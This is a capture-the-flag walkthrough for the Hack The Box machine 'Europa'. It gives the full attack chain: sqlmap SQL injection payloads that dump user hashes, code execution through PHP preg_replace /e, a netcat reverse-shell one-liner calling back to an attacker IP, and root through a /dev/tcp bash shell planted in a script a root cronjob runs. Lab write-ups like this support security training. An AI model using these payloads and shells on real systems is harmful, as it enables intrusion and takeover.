# Europa - 10.10.10.22

## Nmap

```
root@kingpin:~# nmap -sV -sC europacorp.htb
```
``sV`` for determining the service and ``sC`` for default script produces the output of:
```
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (EdDSA)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

``DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb`` is interesting. DNS will not resolve this address, so have to add it to hosts file.

## Accessing admin portal

In ``/etc/hosts`` add an entry for admin-portal.europacorp.htb at 10.10.10.22.
- Port is 443 so do not forget to use SSL when making a request.
- Request https://admin-portal.europacorp.htb/login.php in burp and save the request to ``europa.req``
- ``sqlmap -r europa.req --risk 3 --level 5 --force-ssl --dbms=mysql``
- ``sqlmap -r europa.req --risk 3 --level 5 --force-ssl --dbms=mysql --dump``

Results:
```
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=123@mail.com' RLIKE (SELECT (CASE WHEN (9325=9325) THEN 0x313233406d61696c2e636f6d ELSE 0x28 END))-- CEsa&password=123

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=123@mail.com' OR (SELECT 1273 FROM(SELECT COUNT(*),CONCAT(0x716b627a71,(SELECT (ELT(1273=1273,1))),0x71716a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- cyKd&password=123

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: email=123@mail.com' OR SLEEP(5)-- PaLf&password=123
---

...

Database: admin
Table: users
[2 entries]
+----+----------------------+--------+---------------+----------------------------------+
| id | email                | active | username      | password                         |
+----+----------------------+--------+---------------+----------------------------------+
| 1  | admin@europacorp.htb | 1      | administrator | 2b6d315337f18617ba18922c0b9597ff |
| 2  | john@europacorp.htb  | 1      | john          | 2b6d315337f18617ba18922c0b9597ff |
+----+----------------------+--------+---------------+----------------------------------+
```

First thing is trying the following creds for ssh, but it does not work.

``dashboard.php`` is pretty worthless as there is nothing to fuzz. ``tools.php`` on the other hand it used for generating openvpn config file. Let's look with burp:

```
POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://admin-portal.europacorp.htb/tools.php
Cookie: PHPSESSID=8vo6rh9gilkmq5h9e32r75ocq6
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 1694

pattern=/ip_address/&ipaddress=69.69.13.37;&text="openvpn": {
        "vtun0": {
                "local-address": {
                        "10.10.10.1": "''"
                },
                "local-port": "1337",
                "mode": "site-to-site",
                "openvpn-option": [
                        "--comp-lzo",
                        "--float",
                        "--ping 10",
                        "--ping-restart 20",
                        "--ping-timer-rem",
                        "--persist-tun",
                        "--persist-key",
                        "--user nobody",
                        "--group nogroup"
                ],
                "remote-address": "ip_address",
                "remote-port": "1337",
                "shared-secret-key-file": "/config/auth/secret"
        },
        "protocols": {
                "static": {
                        "interface-route": {
                                "ip_address/24": {
                                        "next-hop-interface": {
                                                "vtun0": "''"
                                        }
                                }
                        }
                }
        }
}
```

Presumably it takes ip address and places it to ``"remote-address": "ip_address"``. Pattern parameter points out that it might as well be PHP regex.

>Several high profile arbitrary code execution vulnerabilities in PHP web applications stem from improper handling of PCRE (Perl Compatible Regular Expression) functions. PCRE is designed to implement regular expressions for the preg_ functions in PHP (such as preg_match and preg_replace). Under most circumstances the PCRE engine is completely safe. It does, however, provide the /e modifier which allows evaluation of PHP code in the preg_replace function. This can be extremely dangerous if used carelessly.
The preg_replace function, when used with the /e modifier and supplied with a PHP function extends the functionality of the replace to allow a callback.
- Source: [MadIrish.net](http://www.madirish.net/402)

Try something simple using /e option on pattern like:
```
pattern=%2Fip_address%2Fe&ipaddress=system(whoami);&text=

Result: www-data
```

Sweet, we have code execution. Time to pop a shell

- set up netcat listener ``nc -lvnp 6969``
- get netcat reverse shell ``rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.48 6969 >/tmp/f``
  - Source: [Pentest monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- url encode '&'
- surround with quotation marks in order to deal with '/'

```
pattern=%2Fip_address%2Fe&ipaddress=system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.15.48 6969 >/tmp/f')&text=
```

## Priv esc

Now start with basic recon, check groups (obv no sudo this time), suid bits and just browse files. Eventually we find a lovely script in `cronjobs` directory.

```php
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

There is no crontab for www-data, possibly the script gets executed by root. Another great piece of news is that there is no ``/var/www/cmd/logcleared.sh``, so might as well just make one.

- set up another nc listener `nc -nlvp 666`
- create a file
  - ``$ echo '#!/bin/bash' > /var/www/cmd/logcleared.sh``
  - ``$ echo '/bin/bash -i >& /dev/tcp/10.10.15.48/666 0>&1' >>/var/www/cmd/logcleared.sh``
- add exec permissions ``$ chmod +x /var/www/cmd/logcleared.sh``
- go celebrate your victory

```
root@kingpin:~# nc -nlvp 666
listening on [any] 666 ...
connect to [10.10.15.48] from (UNKNOWN) [10.10.10.22] 35012
bash: cannot set terminal process group (1901): Inappropriate ioctl for device
bash: no job control in this shell
root@europa:~#
```
